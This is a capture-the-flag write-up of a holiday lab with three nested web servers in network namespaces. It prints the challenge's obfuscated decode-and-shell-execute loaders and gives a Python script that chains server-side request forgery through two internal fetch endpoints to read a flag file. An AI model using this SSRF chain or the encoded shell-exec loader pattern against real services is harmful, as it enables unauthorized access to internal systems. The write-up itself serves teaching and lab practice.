# Challenge 7

## Description

```
**Wow, Zardus thinks he’s Santa 🎅**, offering a cheerful Naughty-or-Nice
checker on `http://localhost/` — but in typical holiday overkill, it has been
served as a full festive *turducken*: **a bright, welcoming outer roast 🦃**,
**a warm, well-seasoned middle stuffing 🦆**, and **a rich, indulgent core that
ties the whole dish together 🐔**. It all looks merry enough at first glance,
yet the whole thing feels suspiciously overstuffed 🎁. Carve into this holiday
creation and see what surprises have been tucked away at the center.
```

## Analysis


This challenge consists of a series of webservers in nested network namespaces.
Each server exposes a some endpoints and launches the next server, which is
embedded in the script somewhere.

The first server is in `/challenge/turkey.py`, it is a flask http server, and
it has a shell script that it executes to launch the next server. This server
has an endpoint `/check`, which takes a `hacker_name` and `hacker_image`
parameters as form data. `hacker_name` must match a name in an allowlist, and
`hacker_image` is an arbitrary url that the server will make a request to and
embed the result as a base64-encoded image in the html response.

Here's the startup code:
```python
if __name__ == '__main__':
    if PAYLOAD:
        decoded = base64.b64decode(PAYLOAD)
        reversed_bytes = decoded[::-1]
        unpacked = bytes(b ^ 0x42 for b in reversed_bytes)
        subprocess.run(unpacked.decode(), shell=True)
    app.run(host='0.0.0.0', port=80, debug=False)
```

The second server is a node js sever, running inside a network namespace in
address `72.79.72.79`, with an endpoint named `fetch`. It takes a url parameter
named `url` for doing a request.

Here's the decoded payload code:
```js
ip netns add middleware
ip link add veth-host type veth peer name veth-middleware
ip link set veth-middleware netns middleware
ip addr add 72.79.72.1/24 dev veth-host
ip link set veth-host up

ip netns exec middleware ip addr add 72.79.72.79/24 dev veth-middleware
ip netns exec middleware ip link set veth-middleware up
ip netns exec middleware ip route add default via 72.79.72.1   
ip netns exec middleware ip link set lo up

iptables -A OUTPUT -o veth-host -m owner --uid-owner root -j ACCEPT
iptables -A OUTPUT -o veth-host -j REJECT

echo "const http = require('http');
const url = require('url');
const { execSync } = require('child_process');

const payload = 'a3IicGd2cHUiY2ZmImRjZW1ncGYMa3IibmtwbSJjZmYieGd2ai9qcXV2InZ7cmcieGd2aiJyZ2d0InBjb2cieGd2ai9kY2VtZ3BmDGtyIm5rcG0idWd2InhndmovZGNlbWdwZiJwZ3ZwdSJkY2VtZ3BmDGtyImNmZnQiY2ZmIjo6MDk5MDg3MDMxNDYiZmd4InhndmovanF1dgxrciJua3BtInVndiJ4Z3ZqL2pxdXYid3IMDGtyInBndnB1Imd6Z2UiZGNlbWdwZiJrciJjZmZ0ImNmZiI6OjA5OTA4NzA6NTE0NiJmZ3gieGd2ai9kY2VtZ3BmDGtyInBndnB1Imd6Z2UiZGNlbWdwZiJrciJua3BtInVndiJ4Z3ZqL2RjZW1ncGYid3IMa3IicGd2cHUiZ3pnZSJkY2VtZ3BmImtyInRxd3ZnImNmZiJmZ2hjd252InhrYyI6OjA5OTA4NzAzIiIiDGtyInBndnB1Imd6Z2UiZGNlbWdwZiJrciJua3BtInVndiJucSJ3cgwMa3J2Y2RuZ3UiL0MiUVdWUldWIi9xInhndmovanF1diIvbyJxeXBndCIvL3drZi9xeXBndCJ0cXF2Ii9sIkNFRUdSVgxrcnZjZG5ndSIvQyJRV1ZSV1YiL3EieGd2ai9qcXV2Ii9sIlRHTEdFVgwMZ3pycXR2IlRDRU1hR1BYP3J0cWZ3ZXZrcXAMDGdlanEiJHRnc3drdGciKXVrcGN2dGMpDAx1Z3YiPGdweGt0cXBvZ3B2LiI8cnRxZndldmtxcAx1Z3YiPGRrcGYuIik6OjA5OTA4NzA6NSkMdWd2IjxycXR2LiI6MgwMaWd2IikxKSJmcQwiIl4kPmozQElxImN5Y3suIntxdylubiJwZ3hndCJoa3BmInZqZyJobmNpPjFqM0BeJAxncGYMDGlndiIpMWhuY2kpImZxDCIia2gicmN0Y291XSl6b2N1KV8iPz8iKWpxanFqcS9rL3ljcHYvdmpnL2huY2kpDCIiIiJIa25nMHRnY2YqKTFobmNpKSsMIiJnbnVnDCIiIiJeJD5qM0B2amN2KXUicHF2ImVxdHRnZXY+MWozQF4kDCIiZ3BmDGdwZgwkIn4ia3IicGd2cHUiZ3pnZSJkY2VtZ3BmIjF3dXQxZGtwMXJqciIvIigM';

if (payload) {
  const decoded = Buffer.from(payload, 'base64');
  const unpacked = Buffer.from(decoded.map(byte => (byte - 2 + 256) % 256));
  execSync(unpacked.toString(), { stdio: 'inherit' });
}

const server = http.createServer(async (req, res) => {
  const parsedUrl = url.parse(req.url, true);

  if (parsedUrl.pathname === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<h1>Welcome to the middleware service. We fetch things!</h1>');
  } else if (parsedUrl.pathname === '/fetch') {
    const targetUrl = parsedUrl.query.url;

    if (!targetUrl) {
      res.writeHead(400, { 'Content-Type': 'text/html' });
      res.end('<h1>Missing url parameter</h1>');
      return;
    }

    try {
      const response = await fetch(targetUrl);
      const content = await response.text();
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end(content);
    } catch (error) {
      res.writeHead(500, { 'Content-Type': 'text/html' });
      res.end(\`<h1>Error fetching URL: \${error.message}</h1>\`);
    }
  } else {
    res.writeHead(404, { 'Content-Type': 'text/html' });
    res.end('<h1>Not Found</h1>');
  }
});

const PORT = process.env.PORT || 80;
const HOST = \"72.79.72.79\";
server.listen(PORT, HOST, () => {
    console.log(\`Server running on http://\${HOST}:\${PORT}\`);
});
" | ip netns exec middleware /usr/bin/cobol - &
```

The third server is a ruby http server, on address `88.77.65.83`. It has a
`/flag` endpoint that will return the flag if the url param `xmas` is
`hohoho-i-want-the-flag`.

Here's the final ruby script:
```ruby
ip netns add backend
ip link add veth-host type veth peer name veth-backend
ip link set veth-backend netns backend
ip addr add 88.77.65.1/24 dev veth-host
ip link set veth-host up

ip netns exec backend ip addr add 88.77.65.83/24 dev veth-backend
ip netns exec backend ip link set veth-backend up
ip netns exec backend ip route add default via 88.77.65.1   
ip netns exec backend ip link set lo up

iptables -A OUTPUT -o veth-host -m owner root -j ACCEPT
iptables -A OUTPUT -o veth-host -j REJECT

export RACK_ENV=production

echo "require 'sinatra'

set :environment, :production
set :bind, '88.77.65.83'
set :port, 80

get '/' do
  \"<h1>Go away, you'll never find the flag</h1>\"
end

get '/flag' do
  if params['xmas'] == 'hohoho-i-want-the-flag'
    File.read('/flag')
  else
    \"<h1>that's not correct</h1>\"
  end
end
" | ip netns exec backend /usr/bin/php - &

```

Note that they reference `/usr/bin/php` and `/usr/bin/cobol` but those are just
symlinks to `ruby` and `node`, respectively.

------------------------------------------------------------------------

```python
import re
import requests
import base64

_PATTERN=r"<img src=\"data:image/png;base64,(.*)\" alt=\"Hacker Image\">"
_ENDPOINT="http://localhost/check"


def main():
    payload = {
        "hacker_name": "adamd",
        "hacker_image": "http://72.79.72.79/fetch?url=http://88.77.65.83/flag?xmas=hohoho-i-want-the-flag",
    }

    response = requests.post(_ENDPOINT, data=payload)
    assert response.status_code == 200
    match = re.search(_PATTERN, response.text)
    assert match is not None
    response = match.groups(1)[0]
    response = base64.b64decode(response)
    print(response.decode())


if __name__ == "__main__":
    main()
```
